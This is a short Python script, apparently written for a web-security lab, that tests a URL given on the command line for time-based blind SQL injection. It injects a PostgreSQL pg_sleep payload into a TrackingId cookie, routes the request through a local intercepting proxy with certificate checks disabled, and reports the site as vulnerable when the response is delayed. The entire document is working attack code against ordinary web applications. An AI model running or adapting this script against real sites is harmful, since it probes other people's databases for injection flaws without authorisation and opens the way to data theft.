import requests
import sys
import urllib3
import urllib
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080' }

def SQLi_time(url):
    payload = "' || (SELECT pg_sleep(10))--"
    payload_encoded = urllib.parse.quote(payload)
    cookies = { 'TrackingId' : 'Qw0neTp66LTYjBXE'+ payload_encoded, 'session' : 'Xjx3N0Ogj43RyMDnJrvW0HapxOvUz7tQ' }
    r = requests.get(url, cookies=cookies, verify= False, proxies=proxies)
    if int(r.elapsed.total_seconds()) >= 10:
        print("[+] Vulnerable to time based SQLi ")
    else:
        print('Failed')


def main ():
    if len(sys.argv) !=2:
        print("Usage: %s <url>" % sys.argv[0])
        print("Example: %s www.example.com " % sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1]
    print("[+] Checking for time based SQLi")
    SQLi_time(url)


if __name__ == "__main__":
    main()